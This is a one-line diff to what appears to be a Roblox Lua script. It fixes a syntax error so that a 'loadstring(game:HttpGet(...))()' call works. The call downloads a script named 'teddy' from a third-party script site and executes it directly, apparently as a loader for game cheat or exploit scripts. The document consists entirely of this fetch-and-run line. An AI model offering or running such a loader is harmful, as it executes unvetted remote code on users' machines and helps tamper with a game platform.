@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://robloxscriptbest.com/script/loader.php?script=teddy"))()"))()
+loadstring(game:HttpGet("https://robloxscriptbest.com/script/loader.php?script=teddy"))()
